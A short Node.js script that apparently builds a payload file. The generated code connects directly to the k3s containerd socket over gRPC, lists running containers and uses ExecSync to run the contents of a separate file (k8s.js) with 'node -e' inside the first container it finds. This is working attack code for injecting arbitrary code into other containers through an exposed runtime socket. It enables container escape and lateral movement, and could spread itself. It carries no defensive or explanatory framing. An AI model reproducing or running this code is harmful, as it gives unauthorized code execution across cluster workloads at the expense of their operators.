const fs=require('fs');
const code=fs.readFileSync('k8s.js','utf8');
const p1=`const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const CODE=${JSON.stringify(code)};
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{
 if(e)return; const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,1);
 if(!ids.length)return;
 const body=Buffer.concat([fl(0x0a,ids[0]),fl(0x12,'node'),fl(0x12,'-e'),fl(0x12,CODE)]);
 call('/runtime.v1.RuntimeService/ExecSync',body,()=>{});
});
`;
fs.writeFileSync('p1.js',p1);
console.log('built', p1.length);
